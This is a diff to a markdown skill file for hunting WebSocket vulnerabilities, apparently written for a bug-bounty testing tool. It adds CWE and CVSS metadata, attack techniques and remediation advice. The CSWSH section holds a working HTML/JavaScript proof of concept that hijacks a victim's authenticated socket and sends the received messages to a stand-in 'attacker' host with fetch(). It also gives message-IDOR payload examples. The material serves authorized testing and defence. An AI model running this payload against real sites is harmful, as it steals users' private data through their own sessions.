@@ -3,6 +3,9 @@ name: hunt-websocket
 description: "Hunt WebSocket vulnerabilities — Cross-Site WebSocket Hijacking (CSWSH), missing/weak Origin validation on the WS handshake, no per-message authentication, message tampering, socket.io namespace/room authorization bypass, and handshake-layer Upgrade smuggling. Use when target has WebSocket endpoints (ws:// or wss://), socket.io / SignalR / Phoenix Channels, real-time features, chat, live dashboards, notifications, or trading platforms."
 sources: hackerone_public, portswigger_research, cve
 report_count: 11
+cwe: [CWE-346, CWE-352, CWE-1385, CWE-20]
+cvss_baseline: "Medium (5.3) message-level info leak → High (7.5-8.1) CSWSH data exfil / unauth sensitive action / cross-user message IDOR → Critical when it reaches ATO."
+related_skills: [hunt-csrf, hunt-cors, hunt-idor, hunt-auth-bypass, hunt-http-smuggling]
 ---
 
 # HUNT-WEBSOCKET — WebSocket Security
@@ -267,6 +270,31 @@ brew install websocat                # alt client; supports text/binary + autore
 | Handshake Upgrade smuggling | Tunnel HTTP past WAF/authz, OAST-confirmed | Smuggling → SSRF/cache poison (High–Critical) |
 
 ---
+
+## New Techniques (2024-2026)
+
+### CSWSH — cross-site WebSocket hijacking (the signature bug)
+The handshake is a cross-site-sendable request; if the server authorizes it by cookie and **doesn't check `Origin`**, an attacker page opens an authenticated socket as the victim:
+```html
+<script>
+ const ws = new WebSocket("wss://target.com/ws");           // victim's cookies ride the handshake
+ ws.onopen = () => ws.send(JSON.stringify({type:"getHistory"}));
+ ws.onmessage = e => fetch("https://attacker/x?d="+encodeURIComponent(e.data)); // exfil
+</script>
+```
+Confirm from an attacker origin with the victim logged in; a message carrying their data = CSWSH. Cross-ref `hunt-csrf`.
+
+### Message-layer authz & injection
+The handshake may authenticate, but per-message actions often skip authz: **message IDOR** (`{"action":"readThread","id":VICTIM}`), unauthenticated sensitive actions, and injection where message content hits a sink (SQLi/XSS/command). Enumerate message `type`/`action` verbs (often in JS bundles) and test each unauth / cross-user.
+
+### Token & transport flaws
+JWT in the WS auth not revalidated/revocable, token in the URL (logged), `ws://` (no TLS) on a `https://` app, Socket.IO/Engine.IO polling-transport fallback that skips origin checks, and HTTP smuggling to the `Upgrade` (cross-ref `hunt-http-smuggling`).
+
+## Remediation
+
+- Validate the handshake `Origin` against an allowlist AND use a CSRF-style token in the handshake (cookies alone are insufficient — that's CSWSH).
+- Authorize every message action server-side against the authenticated principal; validate/encode message content at sinks.
+- Use `wss://` only; keep auth tokens out of the URL; make session/JWT revocation apply to live sockets.
 
 ## Validation (mandatory before reporting)
 
